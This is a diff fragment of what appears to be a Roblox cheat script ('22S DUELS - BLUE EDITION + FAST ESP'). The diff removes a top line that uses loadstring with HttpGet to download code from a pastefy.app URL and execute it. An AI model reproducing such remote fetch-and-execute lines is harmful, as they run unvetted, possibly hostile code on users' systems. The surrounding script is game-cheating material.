@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://pastefy.app/bthqN3E4/raw"))()
-
 task.wait(0.1)
 -- ============================================================
 -- 22S DUELS - BLUE EDITION + FAST ESP
